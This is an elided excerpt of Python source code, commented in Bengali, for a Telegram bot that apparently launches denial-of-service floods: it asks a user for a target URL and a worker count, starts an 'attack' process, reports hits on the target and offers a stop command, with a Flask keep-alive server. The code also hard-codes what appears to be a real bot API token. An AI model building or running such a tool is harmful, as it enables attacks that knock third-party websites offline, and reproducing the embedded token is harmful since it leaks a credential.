...
API_TOKEN = '8287706259:AAHf_8DG6uoGlUjNgWylDvMVSUGTbmwl9yI'
bot = telebot.TeleBot(API_TOKEN)

# Keep Alive-এর জন্য Flask অ্যাপ
app = Flask('')
@app.route('/')
def home(): return "Bot 1 is Running!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

# অ্যাটাক প্রসেস স্টোর করার ডিকশনারি
active_attacks = {}
...
def ask_url(message):
    ...
    bot.register_next_step_handler(msg, get_power)

def get_power(message):
    url = message.text
    msg = bot.send_message(message.chat.id, "💥 পাওয়ার (Workers) সংখ্যা দিন (যেমন: ৫০০):")
...
def start_attack(message, url):
    try:
        ...
        # অ্যাটাক শুরু হওয়ার মেসেজ
        bot.send_message(chat_id, f"🌋 অ্যাটাক চালু হয়েছে!\n🎯 টার্গেট: {url}\n💪 পাওয়ার: {power}\n⚡ ক্লাউড থেকে হিট যাচ্ছে।")
        ...
        active_attacks[chat_id] = {"process": process, "url": url}

        # লাইভ আপডেট থ্রেড চালু করা
...
def stop(message):
    ...
    if chat_id in active_attacks:
        ...
        bot.send_message(chat_id, "🏁 অ্যাটাক বন্ধ করা হয়েছে।")
    else:
